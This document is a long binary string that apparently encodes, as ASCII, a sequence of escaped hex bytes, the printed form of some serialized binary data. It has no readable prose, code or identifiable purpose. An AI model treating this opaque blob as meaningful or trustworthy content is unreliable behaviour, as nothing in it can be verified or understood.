010001011100011110000011100001100110010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000111001001100000101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001110010011000101011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011100100110010010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000111000001101000101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110000011100001011100011110000011000000110000010111000111100000110001001101110110010001101111010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000111001001100110101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001110010011010001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011100000111000010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111001001101010101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001110000011010001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100000111000010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111001001101100101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001110010011011101011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011100100111000010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000111001001110010101110001111000001100000011001001011100011110000011000100110111011001000100111101011100011110000011000000110001010111000111100000110001001101110110010001011100011110000011100101100001010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000111001011000100101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001110010110001101011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011100101100100010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000111001011001010101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001110010110011001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000110000100110000010111000111100000110000001100100101110001111000001100010011011101100100001100000101110001111000001100000011001001011100011110000011000100110111011001000101110001111000011000010011000101011100011110000011000000110010010111000111100000110001001101110110010001011100011110000110011000110100010111000111100000110000001100010101110001111000001100010011011101100100010111000111100000111000001110000101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011000010011001001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000110000100110011010111000111100000110000001100100101110001111000001100010011011101100100010111000111100001100001001101000101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001110000011100001011100011110000011000000110000010111000111100000110001001101110110010000100010010111000111100000110000001100100101110001111000001100010011011101100100010111000111100001100001001101010101110001111000001100000011001001011100011110000011000100110111011001000101110001111000011000010011011001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000110000100110111010111000111100000110000001100100101110001111000001100010011011101100100010111000111100001100001001110000101110001111000001100000011001001011100011110000011000100110111011001000101110001111000011000010011100101011100011110000011000000110010010111000111100000110001001101110110010001011100011110000110000101100001010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000111000001110000101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011000010110001001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000110000101100011010111000111100000110000001100100101110001111000001100010011011101100100010111000111100001100001011001000101110001111000001100000011001001011100011110000011000100110111011001000101110001111000011000010110010101011100011110000011000000110010010111000111100000110001001101110110010001011100011110000110000101100110010111000111100000110000001100100101110001111000001100010011011101100100010111000111100001100010001100000101110001111000001100000011001001011100011110000011000100110111011001000101110001111000011001000011001101011100011110000011000000110001010111000111100000110001001101110110010001011100011110000110010000110100010111000111100000110000001100010101110001111000001100010011011101100100010111000111100001100100001100010101110001111000001100000011000101011100011110000011000100110111011001000101110001111000011000100011000101011100011110000011000000110010010111000111100000110001001101110110010001011100011110000110001000110010010111000111100000110000001100100101110001111000001100010011011101100100010111000111100001100010001100110101110001111000001100000011001001011100011110000011000100110111011001000101110001111000011001000011000101011100011110000011000000110001010111000111100000110001001101110110010001011100011110000110001000110100010111000111100000110000001100100101110001111000001100010011011101100100010111000111100001100101011001000101110001111000001100000011000101011100011110000011000100110111011001000101110001111000011000100011010101011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011100000110100010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100010001101100101110001111000001100000011001001011100011110000011000100110111011001000101110001111000011000100011011101011100011110000011000000110010010111000111100000110001001101110110010001011100011110000110001000111000010111000111100000110000001100100101110001111000001100010011011101100100010100010101110001111000001100000011000101011100011110000011000100110111011001000101110001111000011000100011100101011100011110000011000000110010010111000111100000110001001101110110010001011100011110000110001001100001010111000111100000110000001100100101110001111000001100010011011101100100010111000111100001100010011000100101110001111000001100000011001001011100011110000011000100110111011001000011001001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011100000111000010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100010011000110101110001111000001100000011001001011100011110000011000100110111011001000101110001111000011000100110010001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000110001001100101010111000111100000110000001100100101110001111000001100010011011101100100010111000111100001100010011001100101110001111000001100000011001001011100011110000011000100110111011001000101110001111000011000110011000001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000110001100110001010111000111100000110000001100100101110001111000001100010011011101100100010111000111100001100011001100100101110001111000001100000011001001011100011110000011000100110111011001000101110001111000011000110011001101011100011110000011000000110010010111000111100000110001001101110110010001011100011110000110001100110100010111000111100000110000001100100101110001111000001100010011011101100100010111000111100001100011001101010101110001111000001100000011001001011100011110000011000100110111011001000100001001011100011110000011000000110001010111000111100000110001001101110110010001011100011110000110001100110110010111000111100000110000001100100101110001111000001100010011011101100100010111000111100001100011001100010101110001111000001100000011001001011100011110000011000100110111011001000101110001111000011000110011001001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000110010101100100010111000111100000110000001100010101110001111000001100010011011101100100010111000111100001100011001101110101110001111000001100000011001001011100011110000011000100110111011001000111010101011100011110000011000000110010010111000111100000110001001101110110010001011111010111000111100000110000001100010101110001111000001100010011011101100100010111000111100000111000001101000101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001100010011001001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000110001100111000010111000111100000110000001100100101110001111000001100010011011101100100010100000101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011000110011100101011100011110000011000000110010010111000111100000110001001101110110010001011100011110000110001101100001010111000111100000110000001100100101110001111000001100010011011101100100010111000111100001100011011000100101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001110000011100001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110001101100011010111000111100000110000001100100101110001111000001100010011011101100100010100110101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011000110110010001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000110001101100101010111000111100000110000001100100101110001111000001100010011011101100100010111000111100001100011011001100101110001111000001100000011001001011100011110000011000100110111011001000101110001111000011001000011000001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011100000111000010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100110001101010101110001111000001100000011000101011100011110000011000100110111011001000101110001111000011001000011000101011100011110000011000000110010010111000111100000110001001101110110010001011100011110000110010000110010010111000111100000110000001100100101110001111000001100010011011101100100010111000111100001100100001100110101110001111000001100000011001001011100011110000011000100110111011001000101110001111000011001000011010001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000110010000110101010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000111000001110000101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011001100011010101011100011110000011000000110001010111000111100000110001001101110110010001011100011110000110010000110001010111000111100000110000001100100101110001111000001100010011011101100100010111000111100001100100001100100101110001111000001100000011001001011100011110000011000100110111011001000101110001111000011001000011011001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000110010000110111010111000111100000110000001100100101110001111000001100010011011101100100010111000111100001100100001110000101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001110000011100001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110010000111001010111000111100000110000001100100101110001111000001100010011011101100100010111000111100001100100011000010101110001111000001100000011001001011100011110000011000100110111011001000101110001111000011001000110001001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000110010001100011010111000111100000110000001100100101110001111000001100010011011101100100010111000111100001100100011001000101110001111000001100000011001001011100011110000011000100110111011001000101110001111000011001000011100001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011100000111000010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100100001110010101110001111000001100000011001001011100011110000011000100110111011001000101110001111000011001000110000101011100011110000011000000110010010111000111100000110001001101110110010001011100011110000110010001100010010111000111100000110000001100100101110001111000001100010011011101100100010111000111100001100100011001010101110001111000001100000011001001011100011110000011000100110111011001000101110001111000011001000110011001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000110010100110000010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000111000001110000101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011001010011000101011100011110000011000000110010010111000111100000110001001101110110010001011100011110000110010100110010010111000111100000110000001100100101110001111000001100010011011101100100010111000111100001100101001100110101110001111000001100000011001001011100011110000011000100110111011001000101110001111000011001010011010001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000110011000110100010111000111100000110000001100010101110001111000001100010011011101100100010111000111100000110000001101010101110001111000001100000011001001011100011110000011000100110111011001000101110001111000011001010011010101011100011110000011000000110010010111000111100000110001001101110110010001011100011110000110010100110110010111000111100000110000001100100101110001111000001100010011011101100100010111000111100001100101001101110101110001111000001100000011001001011100011110000011000100110111011001000101110001111000011001010011100001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000110010100111001010111000111100000110000001100100101110001111000001100010011011101100100010111000111100001100101011000010101110001111000001100000011001001011100011110000011000100110111011001000101110001111000011001010110001001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000110010101100011010111000111100000110000001100100101110001111000001100010011011101100100010111000111100001100101011001000101110001111000001100000011001001011100011110000011000100110111011001000101110001111000011001010110010101011100011110000011000000110010010111000111100000110001001101110110010001011100011110000110010101100110010111000111100000110000001100100101110001111000001100010011011101100100010111000111100001100110001100000101110001111000001100000011001001011100011110000011000100110111011001000101110001111000011001100011000101011100011110000011000000110010010111000111100000110001001101110110010001011100011110000110011000110010010111000111100000110000001100100101110001111000001100010011011101100100010111000111100001100110001100110101110001111000001100000011001001011100011110000011000100110111011001000100111001011100011110000011000000110010010111000111100000110001001101110110010001001111010111000111100000110000001100100101110001111000001100010011011101100100010100000101110001111000001100000011001001011100011110000011000100110111011001000101000101011100011110000011000000110010010111000111100000110001001101110110010001010010010111000111100000110000001100100101110001111000001100010011011101100100010100110101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001110000011100001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110010101100011010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100110001101000101110001111000001100000011001001011100011110000011000100110111011001000101110001111000011001100011010101011100011110000011000000110010010111000111100000110001001101110110010001011100011110000110011000110110010111000111100000110000001100100101110001111000001100010011011101100100010111000111100001100100001110010101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011001100011011101011100011110000011000000110010010111000111100000110001001101110110010001011100011110000110011000111000010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000111000001110000101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011001100011100101011100011110000011000000110010010111000111100000110001001101110110010001011100011110000110011001100001010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000110001001101010101110001111000001100000011000101011100011110000011000100110111011001000101110001111000001100010011011001011100011110000011000000110001010111000111100000110001001101110110010001011100011110000011000100110111010111000111100000110000001100010101110001111000001100010011011101100100010111000111100000110001001110000101110001111000001100000011000101011100011110000011000100110111011001000101110001111000001100010011100101011100011110000011000000110001010111000111100000110001001101110110010000101011010111000111100000110000001100100101110001111000001100010011011101100100001011000101110001111000001100000011001001011100011110000011000100110111011001000101110001111000011001100110001001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011100000110100010111000111100000110000001100010101110001111000001100010011011101100100010111000111100000111000001110010101110001111000001100000011000101011100011110000011000100110111011001000101110001111000001110010110011001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000110011001100011010111000111100000110000001100100101110001111000001100010011011101100100010111000111100001100110011001000101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001110000011100001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110000100110010010111000111100000110000001100100101110001111000001100010011011101100100010111000111100001100001001100110101110001111000001100000011001001011100011110000011000100110111011001000101110001111000011000010011010001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011100000111000010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100001011000100101110001111000001100000011001001011100011110000011000100110111011001000101110001111000011000010110001101011100011110000011000000110010010111000111100000110001001101110110010001011100011110000110011000110100010111000111100000110000001100010101110001111000001100010011011101100100010111000111100001100001001100100101110001111000001100000011001001011100011110000011000100110111011001000101110001111000011001100110010101011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011100000111000010111000111100000110000001100000101110001111000001100010011011101100100010001000101110001111000001100000011001001011100011110000011000100110111011001000100010101011100011110000011000000110010010111000111100000110001001101110110010001011100011110000110011001100110010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000110000001100000101110001111000001100000011001101011100011110000011000100110111011001000101110001111000001100000011000101011100011110000011000000110011010111000111100000110001001101110110010001011100011110000011000000110010010111000111100000110000001100110101110001111000001100010011011101100100010111000111100000110000001100110101110001111000001100000011001101011100011110000011000100110111011001000101110001111000001110000011100001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100100110110010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000111001001101110101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001110010011100001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011100100111001010111000111100000110000001100100101110001111000001100010011011101100100010011110101110001111000001100000011000101011100011110000011000100110111011001000101110001111000001110010110000101011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011100101100010010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000111001011000110101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001110010110010001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011100101100101010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000111001011001100101110001111000001100000011001001011100011110000011000100110111011001000101110001111000011000010011000001011100011110000011000000110010010111000111100000110001001101110110010000110000010111000111100000110000001100100101110001111000001100010011011101100100010111000111100001100001001100010101110001111000001100000011001001011100011110000011000100110111011001000101110001111000011001100011010001011100011110000011000000110001010111000111100000110001001101110110010000110011010111000111100000110000001100100101110001111000001100010011011101100100011011100101110001111000001100000011000101011100011110000011000100110111011001000011010001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011100000110100010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100110001100000101110001111000001100000011000101011100011110000011000100110111011001000100110001011100011110000011000000110010010111000111100000110001001101110110010001001101010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000111000001101000101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001100000011010001011100011110000011000000110011010111000111100000110001001101110110010001011100011110000011100000111000010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000110000001101010101110001111000001100000011001101011100011110000011000100110111011001000101110001111000001100000011011001011100011110000011000000110011010111000111100000110001001101110110010001011100011110000011000000110111010111000111100000110000001100110101110001111000001100010011011101100100010111000111100001100100001100010101110001111000001100000011000101011100011110000011000100110111011001000101110001111000001100000011100001011100011110000011000000110011010111000111100000110001001101110110010001011100011101000101110001111000001100000011001101011100011110000011000100110111011001000101110001111000011001100011010001011100011110000011000000110001010111000111100000110001001101110110010001011100011011100101110001111000001100000011001101011100011110000011000100110111011001000100001001011100011110000011000000110001010111000111100000110001001101110110010001011100011110000011000001100010010111000111100000110000001100110101110001111000001100010011011101100100010111000111100000110000001101010101110001111000001100000011001101011100011110000011000100110111011001000101110001111000001100000110001101011100011110000011000000110011010111000111100000110001001101110110010001011100011100100101110001111000001100000011001101011100011110000011000100110111011001000101110001111000011000110110001001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011100000111000010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000110000011001010101110001111000001100000011001101011100011110000011000100110111011001000101110001111000001110000011010001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011000001100110010111000111100000110000001100110101110001111000001100010011011101100100010111000111100000110001001100000101110001111000001100000011001101011100011110000011000100110111011001000101110001111000001100010011000101011100011110000011000000110011010111000111100000110001001101110110010001011100011110000011000100110010010111000111100000110000001100110101110001111000001100010011011101100100010111000111100000111000001101110101110001111000001100000011000101011100011110000011000100110111011001000101110001111000001100010011001101011100011110000011000000110011010111000111100000110001001101110110010001011100011110000011100000111000010111000111100000110000001100000101110001111000001100010011011101100100010111000110111001011100011110000011000000110011010111000111100000110001001101110110010001000010010111000111100000110000001100010101110001111000001100010011011101100100010111000111100000110001001101000101110001111000001100000011001101011100011110000011000100110111011001000101110001111000001100010011010101011100011110000011000000110011010111000111100000110001001101110110010001000010010111000111100000110000001100010101110001111000001100010011011101100100010111000111100000110001001101000101110001111000001100000011001101011100011110000011000100110111011001000101110001111000001100010011011001011100011110000011000000110011010111000111100000110001001101110110010001011100011110000011000100110111010111000111100000110000001100110101110001111000001100010011011101100100010111000111100000111000001110000101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110000011100001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011000100111000010111000111100000110000001100110101110001111000001100010011011101100100010111000111100000110001001110010101110001111000001100000011001101011100011110000011000100110111011001000101110001111000011000010011001001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011000101100001010111000111100000110000001100110101110001111000001100010011011101100100010111000111100000110001011000100101110001111000001100000011001101011100011110000011000100110111011001000101110001111000011000100011000001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011100000111000010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100101011000110101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001100010110001101011100011110000011000000110011010111000111100000110001001101110110010001010100010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000110001011001000101110001111000001100000011001101011100011110000011000100110111011001000101110001111000001100010110010101011100011110000011000000110011010111000111100000110001001101110110010001011100011110000011000101100110010111000111100000110000001100110101110001111000001100010011011101100100001000000101110001111000001100000011001101011100011110000011000100110111011001000101110001111000001110000011011101011100011110000011000000110001010111000111100000110001001101110110010001011100011110000011000000110101010111000111100000110000001100110101110001111000001100010011011101100100001000010101110001111000001100000011001101011100011110000011000100110111011001000010001001011100011110000011000000110011010111000111100000110001001101110110010001011100011110000011100000111000010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100110001100000101110001111000001100000011000101011100011110000011000100110111011001000100110001011100011110000011000000110010010111000111100000110001001101110110010001001101010111000111100000110000001100100101110001111000001100010011011101100100001100110101110001111000001100000011001001011100011110000011000100110111011001000110111001011100011110000011000000110001010111000111100000110001001101110110010000100011010111000111100000110000001100110101110001111000001100010011011101100100001001000101110001111000001100000011001101011100011110000011000100110111011001000010010101011100011110000011000000110011010111000111100000110001001101110110010000100110010111000111100000110000001100110101110001111000001100010011011101100100010111000111100000111000001110000101110001111000001100000011000001011100011110000011000100110111011001000011110001011100011110000011000000110010010111000111100000110001001101110110010000111101010111000111100000110000001100100101110001111000001100010011011101100100010111000010011101011100011110000011000000110011010111000111100000110001001101110110010000101000010111000111100000110000001100110101110001111000001100010011011101100100001010010101110001111000001100000011001101011100011110000011000100110111011001000010101001011100011110000011000000110011010111000111100000110001001101110110010000101011010111000111100000110000001100110101110001111000001100010011011101100100001011000101110001111000001100000011001101011100011110000011000100110111011001000101110001111000001110000011100001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110011000111001010111000111100000110000001100100101110001111000001100010011011101100100010111000111100001100110011000010101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001100010011010101011100011110000011000000110001010111000111100000110001001101110110010001011100011110000011000100110110010111000111100000110000001100010101110001111000001100010011011101100100010111000111100000110001001101110101110001111000001100000011000101011100011110000011000100110111011001000101110001111000001100010011100001011100011110000011000000110001010111000111100000110001001101110110010001011100011110000011000100111001010111000111100000110000001100010101110001111000001100010011011101100100001010110101110001111000001100000011001001011100011110000011000100110111011001000010110001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000110011001100010010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000111000001101000101110001111000001100000011000101011100011110000011000100110111011001000101110001111000001110000011100101011100011110000011000000110001010111000111100000110001001101110110010001011100011110000011100101100110010111000111100000110000001100100101110001111000001100010011011101100100010111000111100001100110011000110101110001111000001100000011001001011100011110000011000100110111011001000101110001111000011001100110010001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011100000111000010111000111100000110000001100000101110001111000001100010011011101100100010011100101110001111000001100000011001001011100011110000011000100110111011001000010110101011100011110000011000000110011010111000111100000110001001101110110010000101110010111000111100000110000001100110101110001111000001100010011011101100100010111000111100000111000001110000101110001111000001100000011000001011100011110000011000100110111011001000010111101011100011110000011000000110011010111000111100000110001001101110110010000110000010111000111100000110000001100110101110001111000001100010011011101100100001100010101110001111000001100000011001101011100011110000011000100110111011001000110010001011100011110000011000000110010010111000111100000110001001101110110010000110010010111000111100000110000001100010101110001111000001100010011011101100100010111000111100000111000001101000101110001111000001100000011000001011100011110000011000100110111011001000101110001101110010111000111100000110000001100110101110001111000001100010011011101100100001100100101110001111000001100000011001101011100011110000011000100110111011001000011001101011100011110000011000000110011010111000111100000110001001101110110010000110100010111000111100000110000001100110101110001111000001100010011011101100100001101010101110001111000001100000011001101011100011110000011000100110111011001000011011001011100011110000011000000110011010111000111100000110001001101110110010000110111010111000111100000110000001100110101110001111000001100010011011101100100010111000111100000111000001101000101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001110000011010001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011100000110101010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000111000001101100101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001110000011011101011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011100000111000010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000111000001110010101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001110000110000101011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011100001100010010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000111000011000110101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001110000110010001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011100001100101010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000111000011001100101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001110010011000001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011100100110001010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000111001001100100101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001110000011010001011100011110000011000000110000010111000111100000110001001101110110010000110011010111000111100000110000001100100101110001111000001100010011011101100100011011100101110001111000001100000011000101011100011110000011000100110111011001000011010001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011100000110100010111000111100000110000001100000101110001111000001100010011011101100100001110000101110001111000001100000011001101011100011110000011000100110111011001000111001101011100011110000011000000110010010111000111100000110001001101110110010000111001010111000111100000110000001100110101110001111000001100010011011101100100010111000111100000111000001101000101110001111000001100000011000001011100011110000011000100110111011001000011101001011100011110000011000000110011010111000111100000110001001101110110010001011100011110000011100000111000010111000111100000110000001100000101110001111000001100010011011101100100001111000101110001111000001100000011001001011100011110000011000100110111011001000011101101011100011110000011000000110011010111000111100000110001001101110110010000111100010111000111100000110000001100110101110001111000001100010011011101100100010111000111100000111000001110000101110001111000001100000011000001011100011110000011000100110111011001000100010001011100011110000011000000110010010111000111100000110001001101110110010000111101010111000111100000110000001100110101110001111000001100010011011101100100001111100101110001111000001100000011001101011100011110000011000100110111011001000101110001111000011001010011010101011100011110000011000000110001010111000111100000110001001101110110010000111111010111000111100000110000001100110101110001111000001100010011011101100100001100110101110001111000001100000011000001011100011110000011000100110111011001000011010001011100011110000011000000110000010111000111100000110001001101110110010001000000010111000111100000110000001100110101110001111000001100010011011101100100010000010101110001111000001100000011001101011100011110000011000100110111011001000100001001011100011110000011000000110011010111000111100000110001001101110110010001000011010111000111100000110000001100110101110001111000001100010011011101100100010001000101110001111000001100000011001101011100011110000011000100110111011001000101110001111000001110000011100001011100011110000011000000110000010111000111100000110001001101110110010000111100010111000111100000110000001100100101110001111000001100010011011101100100010001010101110001111000001100000011001101011100011110000011000100110111011001000100011001011100011110000011000000110011010111000111100000110001001101110110010001000111010111000111100000110000001100110101110001111000001100010011011101100100010010000101110001111000001100000011001101011100011110000011000100110111011001000100100101011100011110000011000000110011010111000111100000110001001101110110010001001010010111000111100000110000001100110101110001111000001100010011011101100100011000100101110001111000001100000011001001011100011110000011000100110111011001000100101101011100011110000011000000110011010111000111100000110001001101110110010001000010010111000111100000110000001100010101110001111000001100010011011101100100010011000101110001111000001100000011001101011100011110000011000100110111011001000100110101011100011110000011000000110011010111000111100000110001001101110110010001011100011110000110010101100100010111000111100000110000001100010101110001111000001100010011011101100100010011100101110001111000001100000011001101011100011110000011000100110111011001000100111101011100011110000011000000110011010111000111100000110001001101110110010001011100011110000011100000111000010111000111100000110000001100000101110001111000001100010011011101100100010001000101110001111000001100000011001001011100011110000011000100110111011001000011110101011100011110000011000000110011010111000111100000110001001101110110010000111110010111000111100000110000001100110101110001111000001100010011011101100100010111000111100001100101001101010101110001111000001100000011000101011100011110000011000100110111011001000101110001111000001110000110010101011100011110000011000000110000010111000111100000110001001101110110010001010000010111000111100000110000001100110101110001111000001100010011011101100100010100010101110001111000001100000011001101011100011110000011000100110111011001000101001001011100011110000011000000110011010111000111100000110001001101110110010001010011010111000111100000110000001100110101110001111000001100010011011101100100010101000101110001111000001100000011001101011100011110000011000100110111011001000110010001011100011110000011000000110010010111000111100000110001001101110110010001010101010111000111100000110000001100110101110001111000001100010011011101100100010101100101110001111000001100000011001101011100011110000011000100110111011001000101011101011100011110000011000000110011010111000111100000110001001101110110010001011000010111000111100000110000001100110101110001111000001100010011011101100100010111000111100001100110011001010101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001110000011100001011100011110000011000000110000010111000111100000110001001101110110010000100010010111000111100000110000001100100101110001111000001100010011011101100100010111000111100001100001001101010101110001111000001100000011001001011100011110000011000100110111011001000011111101011100011110000011000000110010010111000111100000110001001101110110010001011001010111000111100000110000001100110101110001111000001100010011011101100100010110100101110001111000001100000011001101011100011110000011000100110111011001000101101101011100011110000011000000110011010111000111100000110001001101110110010001011100010111000101110001111000001100000011001101011100011110000011000100110111011001000101110101011100011110000011000000110011010111000111100000110001001101110110010001011100011110000011100000111000010111000111100000110000001100000101110001111000001100010011011101100100010111110101110001111000001100000011000101011100011110000011000100110111011001000110000001011100011110000011000000110001010111000111100000110001001101110110010001100001010111000111100000110000001100010101110001111000001100010011011101100100011000100101110001111000001100000011000101011100011110000011000100110111011001000110001101011100011110000011000000110001010111000111100000110001001101110110010001100100010111000111100000110000001100010101110001111000001100010011011101100100011001010101110001111000001100000011000101011100011110000011000100110111011001000110011001011100011110000011000000110001010111000111100000110001001101110110010001100111010111000111100000110000001100010101110001111000001100010011011101100100011010000101110001111000001100000011000101011100011110000011000100110111011001000110100101011100011110000011000000110001010111000111100000110001001101110110010001101010010111000111100000110000001100010101110001111000001100010011011101100100011010110101110001111000001100000011000101011100011110000011000100110111011001000101111001011100011110000011000000110011010111000111100000110001001101110110010000110010010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000111000001110000101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011000010011001001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000110000100110011010111000111100000110000001100100101110001111000001100010011011101100100010111000111100001100001001101000101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001110000011100001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110010001100110010111000111100000110000001100010101110001111000001100010011011101100100010111110101110001111000001100000011001101011100011110000011000100110111011001000101110001111000011001100011001101011100011110000011000000110010010111000111100000110001001101110110010001001110010111000111100000110000001100100101110001111000001100010011011101100100011001100101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001110000011100001011100011110000011000000110000010111000111100000110001001101110110010000111100010111000111100000110000001100100101110001111000001100010011011101100100001111010101110001111000001100000011001001011100011110000011000100110111011001000110000001011100011110000011000000110011010111000111100000110001001101110110010001100001010111000111100000110000001100110101110001111000001100010011011101100100011000100101110001111000001100000011001101011100011110000011000100110111011001000110001101011100011110000011000000110011010111000111100000110001001101110110010001011000010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000111000001110000101110001111000001100000011000001011100011110000011000100110111011001000010010101011100011110000011000000110010010111000111100000110001001101110110010000100110010111000111100000110000001100100101110001111000001100010011011101100100010111000010011101011100011110000011000000110010010111000111100000110001001101110110010001011001010111000111100000110000001100100101110001111000001100010011011101100100010110100101110001111000001100000011001001011100011110000011000100110111011001000101101101011100011110000011000000110010010111000111100000110001001101110110010001011100010111000101110001111000001100000011001001011100011110000011000100110111011001000101110101011100011110000011000000110010010111000111100000110001001101110110010001011110010111000111100000110000001100100101110001111000001100010011011101100100010111110101110001111000001100000011001001011100011110000011000100110111011001000110000001011100011110000011000000110010010111000111100000110001001101110110010001100001010111000111100000110000001100100101110001111000001100010011011101100100011010010101110001111000001100000011000101011100011110000011000100110111011001000110001001011100011110000011000000110010010111000111100000110001001101110110010001100011010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000111000001110000101110001111000001100000011000001011100011110000011000100110111011001000110010001011100011110000011000000110010010111000111100000110001001101110110010000110010010111000111100000110000001100010101110001111000001100010011011101100100011001010101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001110000011100001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110011000110000010111000111100000110000001100010101110001111000001100010011011101100100010011000101110001111000001100000011001001011100011110000011000100110111011001000100110101011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011100000110100010111000111100000110000001100100101